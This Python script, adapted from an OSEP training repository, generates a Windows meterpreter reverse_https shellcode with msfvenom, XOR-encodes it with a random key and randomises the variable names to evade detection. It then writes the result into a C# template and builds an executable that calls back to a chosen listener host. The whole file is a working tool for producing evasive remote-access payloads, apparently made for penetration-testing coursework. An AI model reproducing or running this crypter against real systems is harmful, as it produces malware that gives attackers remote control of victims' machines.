#!/usr/bin/python3

# Original script
# From https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Encoder/shellcodeCrypter-msfvenom.py
# Basic shellcode crypter for C# payloads
# By Cas van Cooten

# jan-karel changes
# limited to csharp only
# default lport= 443
# writes out csharp project and build it


from meuk.hacksec import *

template=lezen('meuk/template/meth.cs')

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use", nargs='?', default="443")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/x64/meterpreter/reverse_https)", nargs='?', default="windows/x64/meterpreter/reverse_https")
parser.add_argument("key", help="the key to encode the payload with (integer)", type=auto_int, nargs='?', default=randint(1,255))
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "csharp"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

# simple obfuscation
letters = string.ascii_lowercase
bufnaam = ''.join(random.choice(letters) for i in range(randint(3,9)))
databuf = ''.join(random.choice(letters) for i in range(randint(3,9)))
uitvoer = ''.join(random.choice(letters) for i in range(randint(3,9)))
waar = ''.join(random.choice(letters) for i in range(randint(4,8)))
# Get the payload bytes and split them
payload = re.search(r"{([^}]+)}", result.stdout.decode("utf-8")).group(1).replace('\n', '').split(",")


payload = xor(payload, args.key)

payLen = len(payload)
payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)

payloadFormatted = f"byte[] [bufnaam] = new byte[{str(payLen)}] {{\n{payload.strip()}\n}};"

template = template.replace('[payloadreplace]', payloadFormatted).replace('[bufnaam]', str(bufnaam)).replace('[quote]', quotes().replace('"','')).replace('[databuf]', databuf).replace('[uitvoer]', uitvoer).replace('[waar]', waar)

decodingFunc = f"""for (int i = 0; i < {str(bufnaam)}.Length; i++)
            {{
                {str(bufnaam)}[i] = (byte)((uint){str(bufnaam)}[i] ^ {hex(args.key)});
            }}"""

template = template.replace('[xorreplace]', decodingFunc)


#create the file with raw ouput
schrijven('meuk/meth/Program.cs', template)

#opslaan code voor include rapportage e.d. als payload default is
schrijven('raw/meth.cs', template)


#build it
result = subprocess.run(['xbuild', 'meuk/meth/meth.csproj'], stdout=subprocess.PIPE)
print(result.stdout)







